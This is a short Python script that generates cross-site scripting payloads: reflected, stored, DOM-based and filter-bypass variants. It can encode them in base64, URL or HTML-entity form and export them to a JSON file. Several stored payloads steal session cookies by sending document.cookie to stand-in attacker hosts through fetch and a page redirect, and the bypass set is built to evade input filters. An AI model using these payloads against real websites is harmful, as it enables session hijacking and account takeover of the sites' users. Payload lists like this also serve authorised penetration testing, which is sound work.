import base64
import urllib.parse
import json

def reflected_payloads():
    return [
        '<script>alert("XSS")</script>',
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '\"><script>alert(1)</script>',
    ]

def stored_payloads():
    return [
        '<script>fetch("http://attacker.com?cookie="+document.cookie)</script>',
        '<img src="x" onerror="document.location=`http://evil.com?xss=`+document.cookie">',
        '<iframe srcdoc="<script>alert(1)</script>">',
    ]

def dom_payloads():
    return [
        '<input autofocus onfocus=alert(1)>',
        '<a href="#" onclick="alert(1)">Click</a>',
        '<body onload=alert(1)>',
        '<script>document.write(location.hash)</script>',
    ]

def bypass_payloads():
    return [
        '<svg><script>confirm(1)</script>',
        '<iframe srcdoc="<script>alert`1`</script>">',
        '<img src=x%00 onerror=alert(1)>',
        '<svg/onload=alert`1`>',
        '<scr<script>ipt>alert(1)</scr</script>ipt>',
    ]

def encode_payloads(payloads, method):
    encoded = []
    for p in payloads:
        if method == "base64":
            encoded.append(base64.b64encode(p.encode()).decode())
        elif method == "url":
            encoded.append(urllib.parse.quote(p))
        elif method == "unicode":
            encoded.append("".join([f"&#{ord(c)};" for c in p]))
        else:
            encoded.append(p)
    return encoded

def export_payloads(payloads, format):
    filename = "xss_payloads"
    if format == "json":
        with open(filename + ".json", "w") as f:
            json.dump(payloads, f, indent=2)
        print(f"[+] Payloads saved to {filename}.json")

def generate_xss_payloads(types=[], encoding=None, export="json", target=None):
    print("\n[+] Generating XSS Payloads...")

    if target:
        print(f"[+] Target provided: {target}")
     

    selected = []
    if not types or "reflected" in types or "all" in types:
        selected += reflected_payloads()
    if "stored" in types or "all" in types:
        selected += stored_payloads()
    if "dom" in types or "all" in types:
        selected += dom_payloads()
    if "bypass" in types:
        selected += bypass_payloads()

    payloads = encode_payloads(selected, encoding)

    for p in payloads:
        print("[+] " + p)

    if export:
        export_payloads(payloads, export)

# Example direct run
if __name__ == "__main__":
    generate_xss_payloads(types=["all", "bypass"], encoding=None, target="http://example.com")
